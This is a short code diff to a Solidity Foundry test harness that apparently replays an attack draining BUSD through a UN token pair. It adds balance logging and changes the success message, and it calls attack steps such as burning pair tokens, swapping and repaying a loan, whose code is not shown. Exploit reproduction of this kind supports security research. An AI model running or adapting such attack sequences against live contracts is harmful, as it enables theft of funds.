@@ -115,7 +115,9 @@ contract UNTestBase is Test, BlockLoader {
         emit log_string("");
     }
 
-    function attackGoal() public view returns (bool) {
+    function attackGoal() public returns (bool) {
+        emit log_named_uint("StartBalance", balanceOfbusdattacker);
+        emit log_named_uint("FinalBalance", busd.balanceOf(attacker));
         return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
     }
 
@@ -205,7 +207,7 @@ contract UNTestBase is Test, BlockLoader {
         burn_un_pair(amt3);
         swap_pair_attacker_un_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        require(!attackGoal(), "Attack failed!");
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
